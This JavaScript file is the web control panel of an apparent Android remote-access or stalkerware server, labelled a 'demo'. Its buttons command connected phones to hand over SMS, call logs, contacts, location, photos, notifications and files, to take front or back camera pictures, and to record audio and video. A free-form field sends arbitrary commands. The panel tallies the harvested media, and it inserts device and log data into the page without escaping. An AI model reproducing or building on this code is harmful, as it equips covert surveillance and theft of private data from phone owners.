// JavaScript for the Android Device Demo Server Web GUI

let pollingInterval = null;
const POLL_INTERVAL = 3000;

document.addEventListener('DOMContentLoaded', () => {
    startPolling();
    setupEventListeners();
});

function setupEventListeners() {
    // Quick command buttons
    const buttons = [
        { id: 'btn-device-info', cmd: 'get_device_info' },
        { id: 'btn-location', cmd: 'get_location' },
        { id: 'btn-gallery', cmd: 'get_gallery_list' },
        { id: 'btn-sms', cmd: 'get_sms_logs' },
        { id: 'btn-call-logs', cmd: 'get_call_logs' },
        { id: 'btn-contacts', cmd: 'get_contacts' },
        { id: 'btn-app-list', cmd: 'get_app_list' },
        { id: 'btn-notifications', cmd: 'get_notifications' },
        { id: 'btn-camera-front', cmd: 'capture_front' },
        { id: 'btn-camera-back', cmd: 'capture_back' },
        { id: 'btn-record-audio', cmd: 'record_audio' },
        { id: 'btn-record-video', cmd: 'record_video' },
        { id: 'btn-get-files', cmd: 'get_file_list' },
        { id: 'btn-storage', cmd: 'get_storage_info' }
    ];

    buttons.forEach(b => {
        const el = document.getElementById(b.id);
        if (el) el.addEventListener('click', () => sendCommand(b.cmd));
    });

    // Custom command send
    const sendBtn = document.getElementById('btn-send-custom');
    if (sendBtn) sendBtn.addEventListener('click', sendCustomCommand);

    const cmdInput = document.getElementById('cmd-input');
    const argsInput = document.getElementById('args-input');
    if (cmdInput) cmdInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendCustomCommand(); });
    if (argsInput) argsInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendCustomCommand(); });
}

function startPolling() {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(fetchData, POLL_INTERVAL);
    fetchData();
}

function fetchData() {
    Promise.all([
        fetch('/api/devices').then(r => r.json()).catch(() => []),
        fetch('/api/logs').then(r => r.json()).catch(() => ({ logs: [] })),
        fetch('/api/stats').then(r => r.json()).catch(() => ({}))
    ])
    .then(([devices, logsData, stats]) => {
        updateDevices(devices);
        updateLogs(logsData);
        updateStats(stats);
    })
    .catch(() => {});
}

function updateDevices(devices) {
    const container = document.getElementById('devices-list');
    if (!container) return;

    if (!devices || devices.length === 0) {
        container.innerHTML = '<p>No devices connected</p>';
        return;
    }

    container.innerHTML = devices.map(d => {
        const statusClass = d.status === 'ONLINE' ? 'online' : 'offline';
        return `
            <div class="device-card" style="background:#1a1a2e;padding:10px;margin:8px 0;border-radius:6px;border-left:3px solid ${d.status === 'ONLINE' ? '#0f0' : '#f00'}">
                <div style="display:flex;justify-content:space-between">
                    <strong>#${d.id}</strong>
                    <span style="color:${d.status === 'ONLINE' ? '#0f0' : '#f00'}">${d.status}</span>
                </div>
                <div style="font-size:0.85rem;color:#aaa;margin-top:4px">
                    IP: ${d.ip}<br>
                    Model: ${d.model}<br>
                    Images: ${d.images} | Videos: ${d.videos} | Notif: ${d.notifications}
                </div>
            </div>
        `;
    }).join('');
}

function updateLogs(data) {
    const container = document.getElementById('logs');
    if (!container) return;

    const logs = data.logs || [];
    if (logs.length === 0) {
        container.innerHTML = '<p>Waiting for logs...</p>';
        return;
    }

    container.innerHTML = logs.map(line => {
        return `<div class="log-entry" style="padding:2px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-family:monospace;font-size:0.85rem">${line}</div>`;
    }).join('');

    // Auto-scroll to bottom
    const logContainer = document.getElementById('logs-container');
    if (logContainer) logContainer.scrollTop = logContainer.scrollHeight;
}

function updateStats(stats) {
    const container = document.getElementById('stats');
    if (!container || !stats) return;

    const uptime = stats.uptime ? Math.round(stats.uptime) + 's' : '0s';
    container.innerHTML = `
        <div class="stat-item"><div class="stat-label">Uptime</div><div class="stat-value">${uptime}</div></div>
        <div class="stat-item"><div class="stat-label">Total Connections</div><div class="stat-value">${stats.total_connections || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Active</div><div class="stat-value">${stats.active_connections || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Images</div><div class="stat-value">${stats.total_images || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Audio</div><div class="stat-value">${stats.total_audio || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Videos</div><div class="stat-value">${stats.total_videos || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Commands</div><div class="stat-value">${stats.total_commands || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Notifications</div><div class="stat-value">${stats.total_notifications || 0}</div></div>
    `;
}

function sendCommand(command, args) {
    fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: command, args: args || '{}' })
    })
    .then(r => r.json())
    .then(data => {
        console.log('Command sent:', command, data);
        // Refresh data after sending command
        setTimeout(fetchData, 1000);
    })
    .catch(err => console.error('Error sending command:', err));
}

function sendCustomCommand() {
    const cmdInput = document.getElementById('cmd-input');
    const argsInput = document.getElementById('args-input');
    
    const command = cmdInput ? cmdInput.value.trim() : '';
    const args = argsInput ? argsInput.value.trim() : '{}';
    
    if (!command) {
        alert('Please enter a command');
        return;
    }
    
    sendCommand(command, args);
    
    if (cmdInput) cmdInput.value = '';
    if (argsInput) argsInput.value = '';
}

// Handle page visibility
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        if (pollingInterval) {
            clearInterval(pollingInterval);
            pollingInterval = null;
        }
    } else {
        if (!pollingInterval) startPolling();
    }
});

window.addEventListener('beforeunload', () => {
    if (pollingInterval) clearInterval(pollingInterval);
});